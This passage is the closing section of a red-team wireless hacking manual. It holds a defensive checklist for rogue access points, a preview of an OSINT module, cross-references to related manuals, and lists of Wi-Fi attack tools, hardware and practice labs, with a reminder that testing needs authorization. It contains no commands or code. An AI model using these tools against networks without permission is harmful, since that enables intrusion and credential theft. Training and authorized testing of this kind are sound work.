║  □ AP placement avoids signal leakage outside building          ║
║  □ Reduce TX power to minimum required for coverage             ║
║  □ Regular audit of authorized AP inventory                     ║
║  □ Authorized AP list in WIDS (alert on unknown APs)            ║
╚══════════════════════════════════════════════════════════════════╝
```

---

*Next module: **OSINT & Reconnaissance** — Maltego, Shodan advanced queries, recon-ng, theHarvester, OSINT framework, social media intelligence, email harvesting, subdomain enumeration, and building a complete target profile before any active testing.*

*Cross-references:*
- *RADIUS/port 1812: `Ports_Protocols_RedTeam_Field_Manual.md` Section 12*
- *AD credential use after capture: `Active_Directory_RedTeam_Field_Manual.md` all sections*
- *Pivoting from wireless foothold: `Network_Pivoting_Tunneling_RedTeam_Field_Manual.md`*
- *Zigbee/BLE wireless: `IoT_Embedded_Systems_RedTeam_Field_Manual.md` Sections 22-23*

*Tools: aircrack-ng suite (airmon-ng, airodump-ng, aireplay-ng, airbase-ng),*
*hcxdumptool, hcxtools, hashcat, reaver, bully, hostapd-wpe, eaphammer,*
*Bettercap, Kismet, FreeRADIUS, asleap, wash, Wireshark*

*Hardware: ALFA AWUS036ACH (dual-band), TP-Link TL-WN722N v1 (budget),*
*Wi-Fi Pineapple (authorized red team engagements), Raspberry Pi (portable AP)*

*Labs: Build your own: two APs + two ALFA adapters + Kali VM*
*TryHackMe: Wifi Hacking 101, WPA Hacking*
*HTB: networking challenges with wireless components*
*Authorized testing only — never test networks without written permission*